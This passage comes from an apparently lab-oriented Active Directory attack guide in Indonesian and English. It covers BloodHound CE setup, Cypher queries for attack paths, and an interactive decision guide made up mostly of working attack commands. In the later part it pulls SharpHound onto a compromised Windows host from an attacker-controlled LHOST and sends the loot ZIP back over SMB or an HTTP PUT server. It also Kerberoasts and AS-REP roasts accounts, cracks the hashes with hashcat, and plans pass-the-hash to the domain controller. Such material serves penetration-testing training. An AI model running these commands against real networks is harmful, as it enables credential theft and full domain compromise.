BloodHound tells you "what relationship exists".
You still have to validate "does it work?"
```

---

## 🥇 Rule 15

```text
Always compare BloodHound data with reality.
```

Data collection adalah snapshot.

---

# 📋 BAGIAN 12 — CHEATSHEET

# 🐳 Start BloodHound

```bash
# Enter BloodHound CE directory
cd ~/tools/bloodhound-ce

# Pull current configured images
docker compose pull

# Start BloodHound CE
docker compose up -d

# Check service status
docker compose ps
```

---

# 🛑 Stop BloodHound

```bash
# Stop containers while preserving data
docker compose down
```

---

# 🔎 Logs

```bash
# Show BloodHound application logs
docker compose logs --tail 100 bloodhound

# Follow application logs
docker compose logs -f bloodhound

# Show graph database logs
docker compose logs --tail 100 graph-db

# Show application database logs
docker compose logs --tail 100 app-db
```

---

# 🐍 CE Python Collector

```bash
# Show collector help
bloodhound-ce-python --help

# Broad collection
bloodhound-ce-python \
  -d "$DOMAIN" \
  -u "$USERNAME" \
  -p "$PASSWORD" \
  -dc "dc01.$DOMAIN" \
  -c All \
  --zip

# Collection with DC as DNS server
bloodhound-ce-python \
  -d "$DOMAIN" \
  -u "$USERNAME" \
  -p "$PASSWORD" \
  -dc "dc01.$DOMAIN" \
  -ns "$DC_IP" \
  -c All \
  --zip
```

---

# 🌐 DNS

```bash
# Resolve DC hostname
getent hosts "dc01.$DOMAIN"

# Query DNS
dig "dc01.$DOMAIN"

# Check reverse DNS
dig -x "$DC_IP"
```

---

# 🪟 SharpHound

```text
# Broad collection
SharpHound.exe -c All

# Name the output ZIP
SharpHound.exe -c All --zipfilename ad_all.zip

# Session-focused collection
SharpHound.exe -c Session

# ACL-focused collection
SharpHound.exe -c ACL

# Trust-focused collection
SharpHound.exe -c Trusts

# DC-focused collection
SharpHound.exe -c DCOnly
```

---

# 📦 Verify ZIP

```bash
# Test ZIP integrity
unzip -t ad_all.zip

# List contents
unzip -l ad_all.zip

# Extract to temporary directory
unzip -o ad_all.zip -d /tmp/bh-check
```

---

# 🔎 Basic Cypher

```cypher
MATCH (n)
RETURN n
LIMIT 5
```

---

# 👤 Users

```cypher
MATCH (u:User)
RETURN u
LIMIT 25
```

---

# 💻 Computers

```cypher
MATCH (c:Computer)
RETURN c
LIMIT 25
```

---

# 👥 Groups

```cypher
MATCH (g:Group)
RETURN g
LIMIT 25
```

---

# 🔗 Membership

```cypher
MATCH (u:User)-[:MemberOf]->(g:Group)
RETURN u,g
LIMIT 50
```

---

# 🎫 Kerberoastable

```cypher
MATCH (u:User)
WHERE u.hasspn = true
RETURN u
ORDER BY u.name
```

---

# 🔥 Unconstrained Delegation

```cypher
MATCH (u:User)
WHERE u.unconstraineddelegation = true
RETURN u
```

---

# 🛡️ AdminCount

```cypher
MATCH (u:User)
WHERE u.admincount = true
RETURN u
```

---

# 💀 DCSync

```cypher
MATCH (n)-[:DCSync|GetChanges|GetChangesAll]->(d:Domain)
RETURN n,d
```

---

# 🖥️ RDP

```cypher
MATCH (u:User)-[:CanRDP]->(c:Computer)
RETURN u,c
```

---

# 💻 PSRemote

```cypher
MATCH (u:User)-[:CanPSRemote]->(c:Computer)
RETURN u,c
```

---

# 🔥 GenericAll

```cypher
MATCH (u:User)-[:GenericAll]->(n)
RETURN u,n
```

---

# 🛠️ WriteDACL

```cypher
MATCH (u:User)-[:WriteDACL]->(n)
RETURN u,n
```

---

# 👑 High Value

```cypher
MATCH (n)
WHERE n.highvalue = true
RETURN n
```

---

# 🟢 Owned → Path

Gunakan:

```text
Mark Owned
    ↓
Open Pathfinding
    ↓
Source = Owned User
    ↓
Target = Domain Admin / High Value
```

---

# 🎹 UI QUICK REFERENCE

|Tujuan|UI Action|
|---|---|
|Cari user|Search|
|Cari computer|Search|
|Cari group|Search|
|Lihat detail object|Click node|
|Cari path|Pathfinding|
|Run Cypher|Explore / Cypher|
|Mark owned|Object actions|
|Mark high value|Object actions|
|Clear graph|Graph controls|
|Import data|Import/Upload|
|Lihat relationship|Click edge/node|

> Menu dan label dapat berubah antar rilis. Hafalkan **fungsi**, bukan lokasi tombol.

---

# 🧠 ONE-MINUTE BLOODHOUND WORKFLOW

```text
FILE 35
  ↓
credentials
  ↓
domain
  ↓
BloodHound ZIP
  ↓
FILE 36
  ↓
Import
  ↓
Verify nodes
  ↓
Mark Owned
  ↓
Find High Value
  ↓
Shortest Path
  ↓
Read every edge
  ↓
Find chokepoint
  ↓
Validate prerequisite
  ↓
Choose easiest path
  ↓
New credential?
  ↓
Mark Owned
  ↓
Re-run pathfinding
```

---

# 🩸 FINAL ATTACK-PATH EXAMPLE

Misalnya graph:

```text
                       ┌─────────────────────┐
                       │   DOMAIN ADMINS     │
                       └──────────┬──────────┘
                                  ▲
                                  │ MemberOf
                                  │
                       ┌──────────┴──────────┐
                       │      IT ADMIN       │
                       └──────────▲──────────┘
                                  │
                              GenericAll
                                  │
                                  │
                       ┌──────────┴──────────┐
                       │      ALICE          │
                       │      OWNED          │
                       └─────────────────────┘
```

BloodHound menjawab:

```text
Alice
 ↓
GenericAll
 ↓
IT Admin
 ↓
MemberOf
 ↓
Domain Admins
```

Sekarang jangan bertanya:

```text
"BloodHound sudah memberi exploit?"
```

Bertanya:

```text
What does GenericAll target?
Can the relationship actually be abused?
Is IT Admin nested?
Is Alice credential still valid?
Is the group protected?
What is the safest lab validation?
```

---

# 🔥 SECOND EXAMPLE — SESSION PATH

```text
ALICE
  │
  │ Owned
  ▼
WEB01
  │
  │ HasSession
  ▼
ADMINISTRATOR
  │
  │ MemberOf
  ▼
DOMAIN ADMINS
```

Pertanyaan:

```text
Can Alice access WEB01?
Can Alice RDP?
Can Alice PSRemote?
Is Administrator's session current?
```

Jadi:

```text
Graph finding
   ↓
technical validation
   ↓
real attack path
```

---

# 🧠 THIRD EXAMPLE — ACL PATH

```text
ALICE
  │
  │ WriteDACL
  ▼
SVC_BACKUP
  │
  │ HasSPN
  ▼
Kerberoastable
  │
  ▼
Credential
  │
  ▼
OWNED
  │
  ▼
Shortest Path
  │
  ▼
DOMAIN ADMIN
```

Ini menunjukkan kenapa BloodHound dapat menghubungkan teknik yang sebelumnya terlihat terpisah.

---

# 🧭 APA YANG HARUS DIBAWA KE FILE 37?

Dari File 36, Anda mungkin menemukan:

```text
[✓] Kerberoastable users
[✓] AS-REP roastable users
[✓] SPNs
[✓] service accounts
```

Contoh:

```text
svc_sql@CORP.LOCAL
SPN:
MSSQLSvc/sql01.corp.local:1433
```

Jangan langsung melakukan random attack.

Simpan:

```text
username
SPN
domain
target host
owned/privileged relationship
```

Kemudian:

→ [File 37: Kerberoasting & AS-REP Roasting](https://chatgpt.com/c/<a href="/docs/kerberoasting-asreproasting" class="text-[#00b4d8] hover:underline font-mono font-semibold">37_kerberoasting_asreproasting_workflow.md</a>)

---

# 🎯 FINAL BLOODHOUND MENTAL MODEL

```text
                 FILE 35
                    │
                    ▼
             RAW AD FACTS
                    │
                    ▼
             BLOODHOUND CE
                    │
        ┌───────────┼───────────┐
        │           │           │
        ▼           ▼           ▼
      NODES        EDGES      TAGS
        │           │           │
        └───────────┼───────────┘
                    ▼
                GRAPH
                    │
                    ▼
             PATH ANALYSIS
                    │
          ┌─────────┼───────────┐
          ▼         ▼           ▼
        USERS     ACLs       SESSIONS
          │         │           │
          └─────────┼───────────┘
                    ▼
             ATTACK PATH
                    │
                    ▼
              VALIDATION
                    │
                    ▼
               NEW ACCESS
                    │
                    ▼
                 OWNED
                    │
                    ▼
            RE-RUN PATHFINDING
                    │
                    ▼
              HIGH VALUE
```

---

# 🧠 FINAL GOLDEN MENTAL LOOP

```text
ENUMERATE
   ↓
COLLECT
   ↓
IMPORT
   ↓
VERIFY
   ↓
OWN
   ↓
QUERY
   ↓
READ GRAPH
   ↓
FIND CHOKEPOINT
   ↓
VALIDATE
   ↓
GAIN ACCESS
   ↓
MARK OWNED
   ↓
REPEAT
```

---

# ⚡ ONE-LINE MUSCLE MEMORY

```text
File 35 data
→ BloodHound CE
→ Import
→ Verify
→ Mark Owned
→ Find High Value
→ Shortest Path
→ Read edges one-by-one
→ Find easiest chokepoint
→ Validate prerequisite
→ Gain new access
→ Mark Owned
→ Repeat
```

---

# 🏁 FINAL RULE

```text
BloodHound does not replace thinking.

It replaces the impossible task of remembering
thousands of Active Directory relationships
inside your head.
```

Jadi ketika melihat graph:

```text
User
 ↓
Group
 ↓
ACL
 ↓
Computer
 ↓
Session
 ↓
Admin
```

jangan hanya melihat:

```text
"ada garis."
```

Baca:

```text
WHO
  ↓
CAN DO WHAT
  ↓
TO WHOM
  ↓
UNDER WHICH CONDITIONS
  ↓
WITH WHICH CREDENTIAL
  ↓
LEADING TO WHICH PRIVILEGE
```

Itulah inti BloodHound.

← [File 35: AD Initial Enumeration](https://chatgpt.com/c/[🏰 35 — Active Directory Initial Enumeration Workflow](/docs/ad-initial-enumeration))  
→ [File 37: Kerberoasting & AS-REP Roasting](https://chatgpt.com/c/<a href="/docs/kerberoasting-asreproasting" class="text-[#00b4d8] hover:underline font-mono font-semibold">37_kerberoasting_asreproasting_workflow.md</a>)

---

---

# 🎯 BAGIAN INTERAKTIF — BLOODHOUND ATTACK DECISION GUIDE

> **Cara baca dokumen ini:** Setiap langkah punya **OUTPUT BERHASIL** ✅ dan **OUTPUT GAGAL/BERBEDA** ❌. Ikuti panah sesuai output yang kamu dapat. Jangan skip langkah.

---

## 🔧 PRE-FLIGHT: Setup Environment

```bash
# Jalankan INI DULU sebelum apapun. Satu kali di awal sesi.
export DOMAIN="corp.local"
export DC_IP="10.10.10.10"
export USERNAME="alice"
export PASSWORD="Password123!"
export LHOST="10.10.14.5"       # IP tun0 kamu (VPN HTB/THM)
export LPORT="4444"

mkdir -p ~/labs/ad/{bloodhound/{collections,incoming},loot,creds,notes}
cd ~/labs/ad

echo "[*] Domain: $DOMAIN | DC: $DC_IP | User: $USERNAME"
echo "[*] LHOST: $LHOST | LPORT: $LPORT"
```

**Output yang diharapkan:**
```
[*] Domain: corp.local | DC: 10.10.10.10 | User: alice
[*] LHOST: 10.10.14.5 | LPORT: 4444
```

---

## ═══════════════════════════════════════
## FASE 0: KONFIRMASI ENVIRONMENT & KONEKSI
## ═══════════════════════════════════════

### Langkah 0.1 — Cek Koneksi ke Domain Controller

```bash
# Command 1: Ping DC untuk konfirmasi alive
ping -c 3 $DC_IP

# Command 2: Cek port LDAP & Kerberos aktif (signature AD)
nmap -Pn -p 88,389,445,636,3268,3269 $DC_IP --open

# Command 3: Konfirmasi ini benar-benar DC via nxc
nxc smb $DC_IP
```

**OUTPUT BERHASIL ✅ — DC terdeteksi:**
```
SMB   10.10.10.10  445  DC01  [*] Windows Server 2019 Build 17763 x64
                              (name:DC01) (domain:CORP.LOCAL)
                              (signing:True) (SMBv1:False)
```

**Cara baca output ini — PENTING, catat semua:**

| Field | Nilai Contoh | Arti & Tindakan |
|---|---|---|
| `name:DC01` | Hostname DC | Tambahkan ke `/etc/hosts` |
| `domain:CORP.LOCAL` | Domain name | Ini environment **Active Directory** |
| `signing:True` | SMB Signing ON | Relay attack tidak bisa |
| `signing:False` | SMB Signing OFF | **KRITIS!** Bisa NTLM Relay → ke <a href="/docs/ntlm-relay" class="text-[#00b4d8] hover:underline font-mono font-semibold">41_ntlm_relay_workflow.md</a> |
| `Build 17763` | Server 2019 | Cek CVE khusus versi ini |

```bash
# Tambahkan DC ke /etc/hosts agar semua tools bisa resolve
echo "$DC_IP dc01.$DOMAIN dc01 $DOMAIN" | sudo tee -a /etc/hosts

# Verifikasi resolusi
ping -c 1 dc01.$DOMAIN
nslookup $DOMAIN $DC_IP
```

**OUTPUT BERHASIL ✅ — Hostname resolve:**
```
64 bytes from dc01.corp.local (10.10.10.10): icmp_seq=1 ttl=128 time=5.2 ms
```

**OUTPUT GAGAL ❌ — Request timeout / Host down:**
```
Request timeout for icmp_seq 0
```
➡️ Coba dengan `-Pn` (mungkin ICMP diblokir firewall):
```bash
nmap -Pn -sS -p 88,389,445 $DC_IP
```
➡️ Jika port 88/389/445 tetap closed: Target bukan DC atau DC salah IP. Balik ke File 35 enumeration.

---

### Langkah 0.2 — Validasi Credentials

```bash
# Command 1: Validasi creds via nxc (paling cepat)
nxc smb $DC_IP -u "$USERNAME" -p "$PASSWORD"

# Command 2: Validasi via Kerberos (jika SMB diblokir)
impacket-getTGT "$DOMAIN/$USERNAME:$PASSWORD" -dc-ip $DC_IP

# Command 3: Validasi via LDAP
nxc ldap $DC_IP -u "$USERNAME" -p "$PASSWORD"
```

**OUTPUT BERHASIL ✅ — Credentials valid:**
```
SMB   10.10.10.10  445  DC01  [+] CORP.LOCAL\alice:Password123!
```

**OUTPUT BERHASIL ✅ — Admin credentials (JACKPOT):**
```
SMB   10.10.10.10  445  DC01  [+] CORP.LOCAL\alice:Password123! (Pwn3d!)
```
➡️ `(Pwn3d!)` = user ini adalah local admin di DC! Langsung ke **Fase 6 — DCSync.**

**OUTPUT GAGAL ❌ — LOGON_FAILURE:**
```
SMB   10.10.10.10  445  DC01  [-] CORP.LOCAL\alice:Password123! STATUS_LOGON_FAILURE
```
➡️ Creds salah. Coba:
```bash
# Coba dengan domain berbeda (mungkin local account)
nxc smb $DC_IP -u "$USERNAME" -p "$PASSWORD" --local-auth

# Coba format domain berbeda
nxc smb $DC_IP -u "CORP\\$USERNAME" -p "$PASSWORD"

# Coba hash jika punya NTLM hash bukan plaintext
nxc smb $DC_IP -u "$USERNAME" -H "aad3b435b51404eeaad3b435b51404ee:NTHASH"
```

**OUTPUT GAGAL ❌ — ACCOUNT_LOCKED_OUT:**
```
SMB   10.10.10.10  445  DC01  [-] CORP.LOCAL\alice:Password123! STATUS_ACCOUNT_LOCKED_OUT
```
➡️ Akun terkunci. Jangan coba password lain! Cek:
```bash
# Estimasi waktu unlock dari lockout policy
rpcclient -U "" -N $DC_IP -c "getdompwinfo" | grep "lockout"
# Tunggu sesuai lockout duration, lalu coba 1 password saja
```

---

## ═══════════════════════════════════════
## FASE 1: COLLECTION DATA BLOODHOUND
## ═══════════════════════════════════════

> **Tujuan fase ini:** Kumpulkan data AD sebanyak mungkin lalu import ke BloodHound. Ini adalah langkah paling penting — garbage in, garbage out.

### Langkah 1.1 — Jalankan BloodHound CE

```bash
# Navigasi ke direktori bloodhound
cd ~/tools/bloodhound-ce

# Start semua container
docker compose up -d

# Cek status containers
docker compose ps
```

**OUTPUT BERHASIL ✅ — Semua container healthy:**
```
NAME                 STATUS
bloodhound-graph-db  Up (healthy)
bloodhound-app-db    Up (healthy)
bloodhound           Up
```

**OUTPUT GAGAL ❌ — Container tidak start:**
```
bloodhound-graph-db  Exit 1
```
➡️ Cek logs:
```bash
docker compose logs graph-db --tail 50
# Masalah umum: port conflict atau disk penuh
docker compose logs app-db --tail 50

# Jika port conflict:
sudo lsof -i :7474 -i :7687 -i :8080
# Kill proses yang conflict, lalu:
docker compose up -d
```

**OUTPUT GAGAL ❌ — Docker daemon tidak jalan:**
```
ERROR: Cannot connect to the Docker daemon
```
➡️ Start Docker:
```bash
sudo systemctl start docker
sudo systemctl status docker
# Jika masih gagal:
sudo systemctl restart docker
```

---

### Langkah 1.2 — Collection dengan bloodhound-ce-python

```bash
# Command UTAMA: Collect semua data dengan satu command
bloodhound-ce-python \
  -d "$DOMAIN" \
  -u "$USERNAME" \
  -p "$PASSWORD" \
  -dc "dc01.$DOMAIN" \
  -ns "$DC_IP" \
  -c All \
  --zip \
  -o ~/labs/ad/bloodhound/collections/

# Lihat hasil collection
ls -lh ~/labs/ad/bloodhound/collections/
```

**OUTPUT BERHASIL ✅ — Collection berjalan:**
```
INFO: Found AD domain: corp.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.corp.local
INFO: Found 1 domains
INFO: Found 42 users
INFO: Found 21 groups
INFO: Found 17 computers
INFO: Found 8 gpos
INFO: Found 12 ous
INFO: Found 1 trusts
INFO: Starting computer enumeration
INFO: Starting session enumeration
INFO: Starting ACL enumeration
INFO: Compressing output
INFO: Done in 00M 45S
```

**Cara baca angka collection — KRITIS:**

| Output | Artinya | Tindakan |
|---|---|---|
| `Found 42 users` | 42 user di domain | Normal |
| `Found 0 computers` | **Collection gagal sebagian** | Cek DNS/SMB |
| `Found 0 sessions` | Tidak ada user aktif log in | Normal jika lab sepi |
| `Found 1 trusts` | Ada domain trust | **Periksa trust attack paths di BloodHound!** |

```bash
# Verifikasi ZIP terbentuk
find ~/labs/ad/bloodhound/collections/ -name "*.zip" -ls
# Harus ada file dengan ukuran > 0
```

**OUTPUT GAGAL ❌ — Kerberos / TGT error:**
```
ERROR: Failed to get Kerberos TGT. Kerberos error 23 (KDC_ERR_PREAUTH_FAILED)
```
➡️ Creds salah atau Kerberos time offset. Cek:
```bash
# Sinkronisasi waktu dengan DC (Kerberos sensitif terhadap perbedaan waktu > 5 menit)
sudo ntpdate $DC_IP
# Atau:
sudo rdate -n $DC_IP
# Lalu retry collection
```

**OUTPUT GAGAL ❌ — LDAP connection error:**
```
ERROR: Could not connect to LDAP server dc01.corp.local
```
➡️ Coba dengan IP langsung:
```bash
bloodhound-ce-python \
  -d "$DOMAIN" \
  -u "$USERNAME" \
  -p "$PASSWORD" \
  -dc "$DC_IP" \
  -ns "$DC_IP" \
  -c All --zip \
  -o ~/labs/ad/bloodhound/collections/
```

**OUTPUT GAGAL ❌ — DNS resolution failed:**
```
ERROR: Failed to resolve hostname dc01.corp.local
```
➡️ Pastikan `/etc/hosts` sudah benar:
```bash
cat /etc/hosts | grep $DOMAIN
# Jika tidak ada:
echo "$DC_IP dc01.$DOMAIN dc01 $DOMAIN" | sudo tee -a /etc/hosts
```

**OUTPUT GAGAL ❌ — Tidak punya bloodhound-ce-python:**
```
bash: bloodhound-ce-python: command not found
```
➡️ Install:
```bash
# Method 1: pipx (recommended)
sudo apt install -y pipx
pipx ensurepath
export PATH="$HOME/.local/bin:$PATH"
pipx install bloodhound-ce

# Method 2: pip biasa
pip3 install bloodhound-ce

# Verify
bloodhound-ce-python --help
```

---

### Langkah 1.3 — Alternative: Collection dari Windows dengan SharpHound

> Gunakan ini jika sudah punya shell di Windows host dalam domain.

```bash
# Di Parrot — siapkan SharpHound untuk transfer
# Download SharpHound dari GitHub releases

# Setup HTTP server untuk transfer
mkdir -p /tmp/transfer
cp ~/tools/SharpHound.exe /tmp/transfer/
cd /tmp/transfer
python3 -m http.server 8888
```

Di Windows (shell yang sudah kamu dapat):
```powershell
# Download SharpHound dari Parrot
curl.exe http://$LHOST:8888/SharpHound.exe -o C:\Windows\Temp\sh.exe

# Jalankan collection
C:\Windows\Temp\sh.exe -c All --zipfilename ad_collection.zip --OutputDirectory C:\Windows\Temp\

# Konfirmasi file terbuat
dir C:\Windows\Temp\*.zip
```

**OUTPUT BERHASIL ✅ — SharpHound selesai:**
```
INFO: Compressing data to C:\Windows\Temp\20240115142345_BloodHound.zip
INFO: You can load this file directly into the UI
INFO: SharpHound Enumeration Completed at 2:23 PM on 01/15/2024
```

Transfer ZIP ke Parrot:
```bash
# Di Parrot — setup SMB receiver
mkdir -p ~/labs/ad/bloodhound/incoming
impacket-smbserver loot ~/labs/ad/bloodhound/incoming -smb2support
```

```cmd
:: Di Windows — kirim ZIP ke Parrot
copy C:\Windows\Temp\*.zip \\LHOST_IP\loot\
```

```bash
# Di Parrot — konfirmasi diterima
ls -lh ~/labs/ad/bloodhound/incoming/*.zip
```

**OUTPUT GAGAL ❌ — SMB transfer blocked:**
```
System error 5 has occurred. Access is denied.
```
➡️ Coba upload via Python HTTP:
```bash
# Di Parrot — buat simple upload server
python3 -c "
import http.server, socketserver
class Handler(http.server.BaseHTTPRequestHandler):
    def do_PUT(self):
        length = int(self.headers['Content-Length'])
        path = self.path.strip('/')
        with open(path,'wb') as f: f.write(self.rfile.read(length))
        self.send_response(200); self.end_headers()
socketserver.TCPServer(('',9999),Handler).serve_forever()
" &
```

```powershell
# Di Windows
curl.exe -T C:\Windows\Temp\ad_collection.zip http://LHOST_IP:9999/ad_collection.zip
```

---

## ═══════════════════════════════════════
## FASE 2: IMPORT & VERIFIKASI DATA
## ═══════════════════════════════════════

### Langkah 2.1 — Import ZIP ke BloodHound CE

```bash
# Buka BloodHound di browser
# Pastikan container sudah jalan (Fase 1, Langkah 1.1)
echo "[*] Buka browser ke: http://localhost:8080/ui/login"

# Dapatkan initial password jika belum pernah login:
docker compose logs bloodhound 2>/dev/null | grep -i "initial password\|password set"
# Atau:
docker logs $(docker compose ps -q bloodhound) 2>&1 | grep -i "password"
```

**OUTPUT BERHASIL ✅ — Password ditemukan:**
```
Initial Password Set To: Ak3Jm9LpXqR2
```
➡️ Login ke `http://localhost:8080/ui/login` dengan:
- Username: `admin`
- Password: `Ak3Jm9LpXqR2`
- (Akan diminta ganti password setelah login pertama)

**OUTPUT GAGAL ❌ — Password tidak muncul di logs:**
```
# Tidak ada output dengan keyword "password"
```
➡️ Reset BloodHound admin:
```bash
# Lihat semua logs dari awal
docker compose logs bloodhound 2>&1 | head -100

# Atau jika deployment baru, destroy dan recreate (data hilang!):
docker compose down -v
docker compose up -d
# Tunggu ~60 detik, lalu:
docker compose logs bloodhound | grep -i "password"
```

---

### Langkah 2.2 — Verifikasi Data Berhasil Diimport

Setelah upload ZIP di UI BloodHound, cari di search bar:
1. Nama domain (`corp.local`) → harus muncul sebagai node Domain
2. Username kamu (`alice`) → harus muncul sebagai node User
3. Nama DC (`DC01`) → harus muncul sebagai node Computer

**OUTPUT BERHASIL ✅ — Data lengkap:**
```
Domain: CORP.LOCAL
  Users: 42
  Groups: 21
  Computers: 17
  OUs: 12
  GPOs: 8
```

**OUTPUT GAGAL ❌ — Data kosong setelah import:**
```
Users: 0
Computers: 0
```
➡️ Import gagal atau ZIP corrupt. Cek:
```bash
# Verifikasi ZIP valid
file ~/labs/ad/bloodhound/collections/*.zip
unzip -t ~/labs/ad/bloodhound/collections/*.zip

# Lihat isi ZIP
unzip -l ~/labs/ad/bloodhound/collections/*.zip

# Jika ZIP corrupt, re-run collection (Fase 1, Langkah 1.2)
```

**OUTPUT GAGAL ❌ — Hanya domain yang muncul, user/computer 0:**
➡️ Collection berhasil tapi data kosong. Coba:
```bash
# 1. Cek apakah user kamu punya LDAP read permission
# Coba collection dengan DCOnly dulu
bloodhound-ce-python -d "$DOMAIN" -u "$USERNAME" -p "$PASSWORD" \
  -dc "dc01.$DOMAIN" -ns "$DC_IP" -c DCOnly --zip \
  -o ~/labs/ad/bloodhound/collections/

# 2. Coba dengan credentials yang lebih privileged (Domain Admin jika ada)
# 3. Cek apakah ada firewall yang blokir LDAP/SMB/RPC
nmap -Pn -p 389,445,135,139 $DC_IP
```

---

## ═══════════════════════════════════════
## FASE 3: ANALISIS AWAL — TEMUKAN ATTACK PATH
## ═══════════════════════════════════════

> **Tujuan:** Dari data yang sudah diimport, temukan jalur tercepat menuju Domain Admin/high-value target.

### Langkah 3.1 — Mark "Owned" Node

> Langkah WAJIB sebelum pathfinding. BloodHound hanya bisa cari "Shortest Path FROM Owned Node" jika node sudah di-mark.

Di UI BloodHound:
1. Search username kamu (`alice`)
2. Klik kanan pada node → pilih **"Mark as Owned"**
3. Konfirmasi dengan icon skull (💀) muncul di node

Atau via Cypher:
```cypher
MATCH (u:User {name: "ALICE@CORP.LOCAL"})
SET u.owned = true
RETURN u
```

**OUTPUT BERHASIL ✅ — Node marked:**
- Node alice sekarang punya icon 💀 (owned)
- Bisa gunakan "Shortest Path from Owned Principals" di queries

**OUTPUT GAGAL ❌ — Node alice tidak ditemukan di search:**
```
No results found for "alice"
```
➡️ Coba format FQDN:
- Search: `ALICE@CORP.LOCAL` (uppercase, full domain)
- Jika masih tidak ada → data collection tidak include user ini, re-run collection

---

### Langkah 3.2 — Query: Shortest Path to Domain Admins

Di UI BloodHound → **Cypher** tab:

```cypher
/* Query 1: Shortest path dari semua owned nodes ke Domain Admin */
MATCH p=shortestPath(
  (n {owned:true})-[*1..]->(g:Group)
)
WHERE g.name =~ "(?i)domain admins.*"
RETURN p
LIMIT 10
```

```cypher
/* Query 2: Shortest path dari user spesifik */
MATCH p=shortestPath(
  (u:User {name: "ALICE@CORP.LOCAL"})-[*1..]->(g:Group)
)
WHERE g.name =~ "(?i)domain admins.*"
RETURN p
```

**OUTPUT BERHASIL ✅ — PATH DITEMUKAN (contoh graph):**
```
alice --[MemberOf]--> Helpdesk
Helpdesk --[GenericAll]--> svc_backup
svc_backup --[AdminTo]--> WEB01
WEB01 --[HasSession]--> Administrator
```

➡️ **JACKPOT!** Catat setiap edge dan baca satu per satu:

| Edge | Source | Target | Artinya | Tindakan |
|---|---|---|---|---|
| `MemberOf` | alice | Helpdesk | alice member grup Helpdesk | Normal, gunakan privilege Helpdesk |
| `GenericAll` | Helpdesk | svc_backup | Helpdesk bisa ATUR svc_backup | → Reset password svc_backup (Langkah 4.2) |
| `AdminTo` | svc_backup | WEB01 | svc_backup adalah local admin di WEB01 | → Login ke WEB01, dump creds |
| `HasSession` | WEB01 | Administrator | Admin sedang login di WEB01 | → Dump hash di WEB01 → PTH ke DC |

**OUTPUT BERHASIL ✅ — Path langsung via DCSync rights:**
```
alice --[GetChangesAll]--> CORP.LOCAL
alice --[GetChanges]--> CORP.LOCAL
```
➡️ Langsung ke **Fase 6 — DCSync!** Ini path tercepat ke full domain compromise.

**OUTPUT GAGAL ❌ — No path found:**
```
No results returned
```
➡️ Tidak ada direct path. Coba:
```cypher
/* Cek apakah alice punya APAPUN yang menarik */
MATCH (u:User {name: "ALICE@CORP.LOCAL"})-[r]->(n)
RETURN type(r), n.name
LIMIT 50
```

```bash
# Jika graph benar-benar kosong → collection tidak dapat ACL data
# Re-run collection dengan explicit ACL method:
bloodhound-ce-python -d "$DOMAIN" -u "$USERNAME" -p "$PASSWORD" \
  -dc "dc01.$DOMAIN" -ns "$DC_IP" -c ACL,ObjectProps,Default --zip \
  -o ~/labs/ad/bloodhound/collections/
```

---

### Langkah 3.3 — Query: Temukan Kerberoastable Users

```cypher
/* Semua user dengan SPN (Kerberoastable) */
MATCH (u:User)
WHERE u.hasspn = true
AND NOT u.name =~ "(?i).*krbtgt.*"
RETURN u.name, u.description, u.admincount
ORDER BY u.admincount DESC
```

**OUTPUT BERHASIL ✅ — Ada Kerberoastable users:**
```
u.name               | u.description              | u.admincount
SVC_MSSQL@CORP.LOCAL | SQL Service Account        | false
SVC_IIS@CORP.LOCAL   | IIS Application Pool       | false
SVC_BACKUP@CORP.LOCAL| Backup Service             | false
```

➡️ Langsung Kerberoast → Langkah 3.4

**PERHATIKAN:** Jika `admincount = true` → itu service account yang punya admin privilege! High-value target!

**BONUS — Jika description mengandung password:**
```
SVC_MSSQL@CORP.LOCAL | description: "SQLSvc - temp pass: Mssql2019!"
```
➡️ **Password bocor di description!** Langsung test:
```bash
nxc smb $DC_IP -u "svc_mssql" -p "Mssql2019!"
```

---

### Langkah 3.4 — Eksekusi Kerberoasting dari Temuan BloodHound

```bash
# Kerberoast semua SPN user sekaligus
impacket-GetUserSPNs "$DOMAIN/$USERNAME:$PASSWORD" \
  -dc-ip $DC_IP \
  -request \
  -outputfile ~/labs/ad/creds/kerberoast_hashes.txt

# Lihat hasilnya
cat ~/labs/ad/creds/kerberoast_hashes.txt
```

**OUTPUT BERHASIL ✅ — Hash TGS didapat:**
```
$krb5tgs$23$*svc_mssql$CORP.LOCAL$corp.local/svc_mssql*$a1b2c3d4e5f6...
$krb5tgs$23$*svc_backup$CORP.LOCAL$corp.local/svc_backup*$b2c3d4...
```

➡️ Crack offline:
```bash
# Hashcat mode 13100 = Kerberos TGS-REP etype 23
hashcat -m 13100 ~/labs/ad/creds/kerberoast_hashes.txt \
  /usr/share/wordlists/rockyou.txt \
  --force -O \
  -o ~/labs/ad/creds/kerberoast_cracked.txt

# Cek hasil crack
cat ~/labs/ad/creds/kerberoast_cracked.txt
# Format output: hash:password
```

**OUTPUT BERHASIL ✅ — Password di-crack:**
```
$krb5tgs$23$*svc_mssql...:Mssql2019!
```

➡️ Simpan dan test ke semua service:
```bash
export KRBTGT_USER="svc_mssql"
export KRBTGT_PASS="Mssql2019!"
echo "$KRBTGT_USER:$KRBTGT_PASS" >> ~/labs/ad/creds/found_creds.txt

nxc smb $DC_IP -u "$KRBTGT_USER" -p "$KRBTGT_PASS"        # Test SMB
nxc mssql $DC_IP -u "$KRBTGT_USER" -p "$KRBTGT_PASS"      # → <a href="/docs/mssql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14b_mssql_workflow.md</a>
nxc winrm $DC_IP -u "$KRBTGT_USER" -p "$KRBTGT_PASS"      # Test WinRM
```

**OUTPUT GAGAL ❌ — hashcat tidak bisa crack:**
```
0 password hashes cracked, 0 left
```
➡️ Coba wordlist dan rules lebih agresif:
```bash
# Coba dengan rules
hashcat -m 13100 ~/labs/ad/creds/kerberoast_hashes.txt \
  /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule --force

# Coba wordlist yang lebih besar
hashcat -m 13100 ~/labs/ad/creds/kerberoast_hashes.txt \
  /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt \
  --force

# Simpan hash dan lanjut, mungkin nanti ketemu password hint dari tempat lain
```

**OUTPUT GAGAL ❌ — Tidak ada SPN user:**
```
No entries found!
```
➡️ Tidak ada user Kerberoastable. Coba ASREPRoasting:
```bash
# Cari user tanpa pre-auth requirement
impacket-GetNPUsers "$DOMAIN/" \
  -usersfile ~/labs/ad/creds/users.txt \
  -dc-ip $DC_IP \
  -format hashcat \
  -outputfile ~/labs/ad/creds/asrep_hashes.txt

cat ~/labs/ad/creds/asrep_hashes.txt
# Jika ada hash → crack dengan hashcat mode 18200
hashcat -m 18200 ~/labs/ad/creds/asrep_hashes.txt /usr/share/wordlists/rockyou.txt --force
```

---

